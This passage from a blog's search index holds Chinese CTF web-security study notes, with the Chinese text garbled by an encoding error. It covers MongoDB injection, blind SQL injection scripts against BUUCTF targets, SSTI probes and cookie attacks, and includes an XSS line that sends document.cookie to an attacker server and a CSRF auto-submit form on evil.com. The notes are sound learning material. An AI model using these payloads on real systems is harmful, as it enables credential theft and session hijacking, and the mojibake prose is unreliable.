æŸ¥è¯¢æ—¶å¯èƒ½ä¼šç›´æ¥æ’å…¥æœªç»è¿‡å¤„ç†çš„ç”¨æˆ·è¾“å…¥ï¼Œä¾‹å¦‚ä»å˜é‡ä¸­ $userData è·å–æŸ¥è¯¢æ¡ä»¶ï¼š\n1 db.users.find({ $where: \u0026#34;function(){return(this.username == $userData)}\u0026#34; }) ç„¶åï¼Œæ”»å‡»è€…å¯èƒ½ä¼šæ³¨å…¥ä¸€ç§æ¶æ„çš„å­—ç¬¦ä¸²å¦‚ â€˜aâ€™; sleep(5000) ï¼Œæ­¤æ—¶ MongoDB æ‰§è¡Œçš„æŸ¥è¯¢è¯­å¥ä¸ºï¼š\n1 db.users.find({ $where: \u0026#34;function(){return(this.username == \u0026#39;a\u0026#39;; sleep(5000))}\u0026#34; }) å¦‚æœæ­¤æ—¶æœåŠ¡å™¨æœ‰ 5 ç§’é’Ÿçš„å»¶è¿Ÿåˆ™è¯´æ˜æ³¨å…¥æˆåŠŸã€‚ å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨ MongoDB 2.4 ä¹‹å‰ï¼Œé€šè¿‡ $where æ“ä½œç¬¦ä½¿ç”¨map-reduceã€group å‘½ä»¤å¯ä»¥è®¿é—®åˆ° Mongo Shell ä¸­çš„å…¨å±€å‡½æ•°å’Œå±æ€§ï¼Œå¦‚dbï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥é€šè¿‡è‡ªå®šä¹‰ JavaScript å‡½æ•°æ¥è·å–æ•°æ®åº“çš„æ‰€æœ‰ä¿¡æ¯ã€‚ åœ¨MongoDB 2.4 ä¹‹ådbè®¿é—®ä¸åˆ°äº†ï¼Œä½†è¿˜æ˜¯å¯ä»¥æ„é€ ä¸‡èƒ½å¯†ç æŸ¥å‡ºç”¨æˆ·ä¿¡æ¯\nå¸ƒå°”ç›²æ³¨ï¼š å½“é¡µé¢æ²¡æœ‰å›æ˜¾çš„æ—¶å€™å¯ä»¥ä½¿ç”¨$regexæ­£åˆ™è¡¨è¾¾å¼æ¥è¿›è¡Œç›²æ³¨ï¼Œ$regexå¯ä»¥è¾¾åˆ°å’Œä¼ ç»ŸSQLæ³¨å…¥ä¸­substr()å‡½æ•°ç›¸åŒçš„åŠŸèƒ½ã€‚\nå’Œä¼ ç»ŸSQLæ³¨å…¥ä¸€æ ·ï¼Œåœ¨å·²çŸ¥ç”¨æˆ·åçš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“å¯†ç é•¿åº¦ã€‚å¯ä»¥ä½¿ç”¨\nusername=admin\u0026amp;password[$regex]=.[4] (â€œ[]â€ä¸­çš„æ•°å­—å¯ä»¥æ›´æ”¹æ¥ç¡®å®šå¯†ç é•¿åº¦ï¼Œå¦‚æœ[4]ä¸ºçœŸï¼Œ[5]ä¸ºå‡ï¼Œåˆ™å¯†ç ä¸º4ä½)\nNode.jsä¸­çš„MongoDBæ³¨å…¥\rNode.jsä¸­çš„MongoDBæ³¨å…¥ä¸»è¦æ˜¯é‡è¨€å¼æ³¨å…¥ï¼Œé€šè¿‡æ„é€ æ°¸çœŸå¼ä¸‡èƒ½å¯†ç å®ç°ç™»å½•ç»•è¿‡ å¦å¤–ï¼Œå¦‚æœè¿‡æ»¤äº†$neå…³é”®å­—å¯ä»¥ä½¿ç”¨Unicodeç¼–ç ç»•è¿‡ã€‚ åœ¨è¿™é‡Œè´´ä¸€ä¸ªå¸ƒå°”ç›²æ³¨ç”¨äºçˆ†å¯†ç çš„è„šæœ¬\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 plaintext import requests import string password = \u0026#39;\u0026#39; url = \u0026#39;http://node4.buuoj.cn:27409/login.php\u0026#39; while True: for c in string.printable: if c not in [\u0026#39;*\u0026#39;, \u0026#39;+\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;?\u0026#39;, \u0026#39;|\u0026#39;, \u0026#39;#\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;$\u0026#39;]: # When the method is GET get_payload = \u0026#39;?username=admin\u0026amp;password[$regex]=^%s\u0026#39; % (password + c) # When the method is POST post_payload = { \u0026#34;username\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;password[$regex]\u0026#34;: \u0026#39;^\u0026#39; + password + c } # When the method is POST with JSON json_payload = \u0026#34;\u0026#34;\u0026#34;{\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;, \u0026#34;password\u0026#34;:{\u0026#34;\\\\u0024\\\\u0072\\\\u0065\\\\u0067\\\\u0065\\\\u0078\u0026#34;:\u0026#34;^%s\u0026#34;}}\u0026#34;\u0026#34;\u0026#34; % (password + c) headers = {\u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;} r = requests.post(url=url, headers=headers, data=json_payload) # ç®€å•å‘é€ json #r = requests.post(url=url, data=post_payload) if \u0026#39;ä½†æ²¡å®Œå…¨ç™»å½•\u0026#39; in r.content.decode(): print(\u0026#34;[+] %s\u0026#34; % (password + c)) password += c # è¾“å‡º: # [+] 4 # [+] 42 # [+] 422 # [+] 4227 # [+] 42276 # [+] 422766 # ...... # [+] 42276606202db06ad1f29ab6b4a1 # [+] 42276606202db06ad1f29ab6b4a13 # [+] 42276606202db06ad1f29ab6b4a130 # [+] 42276606202db06ad1f29ab6b4a1307 # [+] 42276606202db06ad1f29ab6b4a1307f å…³äºLinuxä¸­çš„ç®¡é“ç¬¦ |\rç®¡é“ç¬¦åœ¨ä»¥å‰RCEçš„æ—¶å€™ä¹Ÿè§åˆ°è¿‡ä½†æ˜¯æ²¡æœ‰è¿›è¡Œç³»ç»Ÿç ”ç©¶ï¼Œæœ€è¿‘åˆ·é¢˜çš„æ—¶å€™åˆé‡åˆ°äº†ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œè®°å½•ä¸€ä¸‹ ä½¿ç”¨|å¯ä»¥å°†ä¸¤ä¸ªå‘½ä»¤åˆ†éš”å¼€æ¥ï¼ŒåŒæ—¶ç®¡é“ç¬¦å·¦è¾¹å‘½ä»¤çš„è¾“å‡ºå¯ä»¥ä½œå³è¾¹å‘½ä»¤çš„è¾“å…¥ å› æ­¤åœ¨é‡åˆ°ä¸€äº›å·²ç»å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼ˆæ¯”å¦‚Pingï¼‰çš„é¶æœºä¸Šï¼Œé€šè¿‡|è¿æ¥catæˆ–findæˆ–grepå‘½ä»¤æ¥æ‰¾åˆ°flag\nMD5\rMD5ç»•è¿‡çœŸæ˜¯äº”èŠ±å…«é—¨ï¼Œffifdyopå’Œ129581926211651571912466741651878684928å¯ç”¨äºSQLæ³¨å…¥æ—¶è¯­å¥ç»è¿‡MD5åŠ å¯†ä¹‹åçš„ç»•è¿‡ï¼Œå…¶åŸç†æ˜¯ï¼šæäº¤çš„å­—ç¬¦ä¸²ç»è¿‡åŠ å¯†å½¢æˆçš„16è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢æˆ10è¿›åˆ¶æ•°å­—åå¯¹åº”çš„asiiè¡¨å†…å®¹ä¸ºï¼šâ€˜ or â€˜ 6â€¦â€¦ã€‚ å¦å¤–ï¼Œæ•°ç»„ç»•è¿‡è¿˜å¯ä»¥ç»•è¿‡if($_POST[â€˜param1â€™]!==$_POST[â€˜param2â€™]\u0026amp;\u0026amp;md5($_POST[â€˜param1â€™])===md5($_POST[â€˜param2â€™]))\nSQLå¸ƒå°”ç›²æ³¨\rç¬¬ä¸€æ¬¡åœ¨é¢˜ç›®ä¸­é‡åˆ°å¸ƒå°”ç›²æ³¨ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œè®°å½•ä¸€ä¸‹ é¢˜ç›®ï¼š\n[[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World 1](https://buuoj.cn/challenges#[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World)\næˆ‘ä¸€å¼€å§‹æ€€ç–‘æ˜¯NoSQLï¼ˆå› ä¸ºé¢˜ç›®æç¤ºæ˜¯SQLæ³¨å…¥ï¼ŒPHPï¼‰ï¼Œç»“æœå°è¯•username[$ne]=1\u0026amp;password[$ne]=1å‘ç°å·²ç»è¢«è¿‡æ»¤äº†ã€‚é‚å°è¯•æ™®é€šçš„SQLæ³¨å…¥ è¾“å…¥*1â€™ or 1=1 â€“+å’Œ1;show databases();#*å‘ç°å‡è¢«è¿‡æ»¤ï¼Œè€Œè¾“å…¥1å’Œ2çš„æ—¶å€™ç™»é™†æˆåŠŸï¼Œè¾“å…¥3ä»¥ä¸Šçš„æ•°å­—ä»¥åŠå­—æ¯éƒ½ä¼šæŠ¥é”™ï¼ˆå›æ˜¾bool flaseï¼‰ æ‰€ä»¥çŒœæµ‹è¿™é‡Œéœ€è¦å¸ƒå°”ç›²æ³¨ï¼ŒåŒæ—¶å±è”½äº†å…³é”®è¯ å°è¯•Fuzzä¸€ä¸‹çœ‹çœ‹å±è”½äº†å“ªäº›å…³é”®è¯\n1 2 3 4 è¿™é‡Œç²˜è´´ä¸€äº›ç”¨äºFuzzçš„å­—å…¸ https://github.com/Underwood12/FuzzDict è¿™æ˜¯Fuzzæ•™ç¨‹ https://www.bilibili.com/video/BV1Zs42137tf é¢˜ç›®ç»™åº“åå’Œè¡¨åéƒ½æ˜¯flag æ‰€ä»¥ç”¨id=0^(ascii(substr((select(flag)from(flag)),1,1))\u0026gt;101) æ¥æŸ¥è¯¢ï¼Œç”±äºå½“\u0026gt;102çš„æ—¶å€™æŠ¥é”™ï¼Œè¯´æ˜ç¬¬ä¸€ä¸ªå­—ç¬¦å°±æ˜¯102çš„asciiæ‰€å¯¹åº”çš„å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯f ç„¶åä½¿ç”¨è„šæœ¬\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 plaintext import requests url = \u0026#34;http://bdff4bff-23c2-43c2-969e-74bedf958792.node3.buuoj.cn/index.php\u0026#34; result = \u0026#34;\u0026#34; num = 0 # ç”¨äº†æ¥åˆ¤æ–­æ˜¯ä¸æ˜¯flagå·²ç»æ‹¼å®Œæ•´äº† for i in range(1, 60): if num == 1: break for j in range(32, 128): payload = \u0026#34;if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)\u0026#34; % (i, j) # print(str((i-1)*96+j-32)+\u0026#34;:~\u0026#34;+payload+\u0026#34;~\u0026#34;) data = { \u0026#34;id\u0026#34;: payload, } r = requests.post(url, data=data) r.encoding = r.apparent_encoding if \u0026#34;Hello\u0026#34; in r.text: x = chr(j) result += str(x) print(result) break if \u0026#34;}\u0026#34; in result: print(result) num = 1 break å¾—åˆ°flag\nSSTI\råšäº†ä¸€é“BUUCTFé¢˜ï¼Œæ¥è§¦äº†è®¸å¤šæ–°çš„çŸ¥è¯†ç‚¹ã€‚åœ¨è¿™é‡Œè®°å½•ä¸€ä¸‹ é¢˜ç›®åœ¨è¿™ï¼š\nğŸ‘‰ [BJDCTF2020 é¢˜ç›®é“¾æ¥](https://buuoj.cn/challenges#[BJDCTF2020]Cookie is so stable)\n1.SSTI\rSSTIæ˜¯è¿™é“é¢˜æ‰€è€ƒå¯Ÿçš„çŸ¥è¯†ç‚¹ï¼Œæ‰€ä»¥å†™åœ¨æœ€å‰é¢\nå¦‚ä½•åˆ¤æ–­æ˜¯SSTI\rä¼—æ‰€å‘¨çŸ¥ï¼ŒSSTIæ˜¯åˆ©ç”¨æœåŠ¡å™¨æ¨¡æ¿æ¼æ´ï¼Œåœ¨æ¨¡æ¿å¼•æ“ä¸­æ³¨å…¥æ¶æ„ä»£ç æ¥è¿›è¡Œæ”»å‡»ã€‚ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è¾“å…¥ä¸€äº›ç‰¹æ®Šçš„â€œæ¢é’ˆâ€ï¼Œè§‚å¯ŸæœåŠ¡å™¨å“åº”çš„å˜åŒ–æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨SSTI å¸¸è§çš„SSTIæ¢é’ˆï¼š\nâ€‹ {{77}} # Jinja2, Nunjucks, Twigç­‰ ${77} # JSP, Freemarker, Spring \u0026lt;%= 7 * 7 %\u0026gt; # EJS (Embedded JavaScript) #{7*7} # Thymeleaf\næˆ‘ä»¬å¯ä»¥åœ¨è¾“å…¥æ¡†ã€URLå‚æ•°ã€HTTPå¤´ã€Cookiesç­‰ä½ç½®å°è¯•è¾“å…¥è¿™äº›æ¢é’ˆã€‚ç„¶åæŸ¥çœ‹é¡µé¢è¿”å›é‡Œæœ‰æ²¡æœ‰49ï¼Œå¦‚æœæœ‰49ï¼Œè¯´æ˜è¿™é‡Œæ‰§è¡ŒæˆåŠŸäº†ï¼Œåˆ™å­˜åœ¨SSTIæ¼æ´\nä¸åŒçš„æ¨¡æ¿ä¸­ä½¿ç”¨ä¸åŒçš„æ³¨å…¥æ ¼å¼\nJinja2 å’Œ Twig: ä½¿ç”¨ {{ }} Freemarker å’Œ Spring: ä½¿ç”¨ ${ } EJS: ä½¿ç”¨ \u0026lt;%= %\u0026gt; Thymeleaf: ä½¿ç”¨ #{ } æœ‰æ—¶å€™ä¼šå¯¹å¤§æ‹¬å·ä¹‹ç±»çš„è¿›è¡Œè¿‡æ»¤ï¼Œæ‰€ä»¥å¯ä»¥ç”¨Unicodeè¿›è¡Œç»•è¿‡ ğŸ‘‰ SSTI åˆ©ç”¨çš„æ–‡ç« \n2.è¿™é“é¢˜æç¤ºæŸ¥çœ‹Cookieï¼Œçœ‹çœ‹èƒ½ä»Cookieä¸­çªç ´çš„è¿˜æœ‰ä»€ä¹ˆï¼Ÿ\rCookieå¯ä»¥ä»ä»¥ä¸‹æ–¹é¢å…¥æ‰‹ 1.HttpOnlyã€Secureã€SameSite æ ‡å¿—ï¼šå¦‚æœCookieæ²¡æœ‰è®¾ç½®è¿™äº›æ ‡å¿—ï¼Œå¯èƒ½å¯ä»¥é€šè¿‡XSSæ”»å‡»çªƒå–Cookieã€‚ 2.å¼±JWTç­¾åï¼šå¦‚æœJWTä½¿ç”¨å¼±çš„å¯¹ç§°åŠ å¯†å¯†é’¥ï¼ˆå¦‚ secretï¼‰æˆ–æ— ç­¾å (none algorithm)ï¼Œå¯ä»¥ç›´æ¥ä¼ªé€ JWTã€‚ 3.å®¢æˆ·ç«¯éªŒè¯ï¼šCTFä¸­å¸¸è§çš„â€œrole=guestâ€â†’â€œrole=adminâ€æƒé™æå‡ã€‚ 4.ä¼šè¯å›ºå®š (Session Fixation)ï¼šå¦‚æœä½ èƒ½æ§åˆ¶Session IDï¼Œå¯èƒ½å¯ä»¥å†’å……ç®¡ç†å‘˜ã€‚\nè¿™é‡Œè¯¦ç»†å†™ä¸€ä¸‹ç¬¬ä¸€ç‚¹å’Œç¬¬äºŒç‚¹\nä¸€ã€HttpOnlyã€Secureã€SameSite æ ‡å¿— æˆ‘ä»¬å¯ä»¥ä½¿ç”¨F12æ‰“å¼€æ§åˆ¶å°ï¼Œç„¶ååœ¨åº”ç”¨ç¨‹åº (Application)â€â†’â€œå­˜å‚¨ (Storage)â€â†’â€œCookiesâ€ä¸­ï¼Œæ£€æŸ¥Cookieçš„å±æ€§ï¼š\n1 2 3 HttpOnlyï¼šå¦‚æœæœªå¯ç”¨ï¼Œå¯èƒ½å¯ä»¥é€šè¿‡XSSæ”»å‡»æ¥çªƒå–Cookieã€‚ Secureï¼šå¦‚æœæœªå¯ç”¨ï¼Œå¯èƒ½ä¼šåœ¨HTTPè€Œä¸æ˜¯HTTPSä¸Šä¼ è¾“Cookieã€‚ SameSiteï¼šå¦‚æœä¸ºNoneï¼Œå¯èƒ½å¯ç”¨äºCSRFæ”»å‡»ã€‚ 1. åˆ©ç”¨ HttpOnly\rå¼€å¯HttpOnlyåˆ™ç¦æ­¢é€šè¿‡JavaScriptè®¿é—®Cookie å¦‚æœè¿™é‡Œæ˜¯å…³çš„ï¼Œé‚£å°±å¯ä»¥\n1 2 plaintext \u0026lt;script\u0026gt;fetch(\u0026#39;http://yourserver.com/steal?cookie=\u0026#39; + document.cookie);\u0026lt;/script\u0026gt; é€šè¿‡é’“é±¼çš„æ–¹å¼æ¥è·å–ç®¡ç†å‘˜çš„ä¼šè¯ID\n2. åˆ©ç”¨æœªè®¾ç½® Secure çš„ Cookie\rä½¿ç”¨Burp Suiteæˆ–Wiresharkè¿›è¡ŒæŠ“åŒ…ã€‚ åœ¨HTTPè¯·æ±‚ä¸­ï¼Œå¯»æ‰¾Cookie: PHPSESSID=xxxxã€‚ å¦‚æœä¼šè¯IDå‡ºç°åœ¨HTTPè¯·æ±‚ä¸­ï¼Œè€Œä¸æ˜¯HTTPSä¸­ï¼Œåˆ™å¯ä»¥åŠ«æŒä¼šè¯ã€‚ å¦‚æœé¢˜ç›®è€ƒå¯Ÿæ˜¯ä¸­é—´äººæ”»å‡» (MITM)ï¼Œä½ å¯ä»¥ä½¿ç”¨Wiresharkæ¥æ•è·Cookieï¼š è¿‡æ»¤å™¨ï¼šhttp.cookieã€‚ æŸ¥æ‰¾â€œSet-Cookieâ€æˆ–â€œCookieâ€å­—æ®µä¸­çš„ä¼šè¯IDã€‚\n3. åˆ©ç”¨ä¸å®‰å…¨çš„ SameSite å±æ€§\rå¦‚æœSameSiteæ ‡å¿—ä¸ºNoneï¼Œåˆ™è·¨ç«™è¯·æ±‚å¯ä»¥æºå¸¦ä¼šè¯IDã€‚ è¿™ä½¿å¾—CSRFæ”»å‡»æˆä¸ºå¯èƒ½ã€‚ åœ¨æ”»å‡»è€…çš„ç½‘ç«™ï¼ˆæ¯”å¦‚ http:/ /evil.comï¼‰ä¸Šæ”¾ç½®ä»¥ä¸‹è¡¨å•ï¼š\n1 2 3 4 5 plaintext \u0026lt;form action=\u0026#34;http ://victim.com/change_password.php\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;password\u0026#34; value=\u0026#34;newpassword123\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt;document.forms[0].submit();\u0026lt;/script\u0026gt; å¦‚æœå—å®³è€…è®¿é—®evil. comï¼Œè¡¨å•ä¼šåœ¨å—å®³è€…çš„ä¼šè¯ä¸­è‡ªåŠ¨æäº¤ã€‚\nå¦‚æœSameSite=Noneï¼Œæµè§ˆå™¨ä¼šå°†å—å®³è€…çš„ä¼šè¯ID (PHPSESSID) è‡ªåŠ¨æºå¸¦åˆ°è¯·æ±‚ä¸­ï¼Œç®¡ç†å‘˜çš„èº«ä»½å°†è¢«åˆ©ç”¨ã€‚\n","date":"2025-06-01T00:00:00Z","permalink":"https://Oight.github.io/p/nosql%E6%B3%A8%E5%85%A5/","title":"NoSQLæ³¨å…¥"},{"content":" ä»¥æ­¤æ–‡è®°å½•æˆ‘åœ¨å­¦ä¹ CTFä¸­çš„å¿ƒè·¯å†ç¨‹ï¼Œæ—¥æ‹±ä¸€å’ï¼ŒåŠŸä¸å”æã€‚\rä¸€ã€WEBå­¦ä¹ ç›®å½•\rå·¥å…·ç¯‡ï¼š\rWEBçš„å¸¸ç”¨å·¥å…·æœ‰ï¼š BurpSuiteï¼ˆä¸€æ¬¾å¸¸ç”¨çš„æŠ“åŒ…å·¥å…·ï¼Œåº”ç”¨å¹¿æ³›ï¼Œæ–‡ä»¶ä¸Šä¼ å¿…ä¸å¯å°‘çš„åˆ©å™¨ï¼‰ Hackerbarï¼ˆæµè§ˆå™¨æ’ä»¶ï¼Œä¼ å‚çš„å¥½å¸®æ‰‹ï¼‰ èšå‰‘ï¼ˆè¿æ¥å·¥å…·ï¼‰ è¿˜æœ‰è®¸è®¸å¤šå¤šçš„éƒ¨ç½²åœ¨Linuxä¸Šçš„å·¥å…·ï¼Œâ€¦â€¦è¿™é‡Œçš„ä¸œè¥¿å°±ä»¥åå†æ¥æ¢ç´¢å§ï¼ˆï¼‰ ### æ‹¥æœ‰äº†å…¥é—¨çš„å·¥å…·ï¼Œå°±å¯ä»¥æ­¥å…¥WEBçš„ä¸–ç•ŒåŠ›ï¼ˆå–œï¼‰\nWEBåŒ…æ‹¬å“ªäº›å†…å®¹ï¼š\r1.æ–‡ä»¶åŒ…å« 2.æ–‡ä»¶ä¸Šä¼ \n","date":"2025-06-01T00:00:00Z","permalink":"https://Oight.github.io/p/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84ctf%E6%8E%A2%E9%99%A9/","title":"ä»é›¶å¼€å§‹çš„CTFæ¢é™©ï¼"}]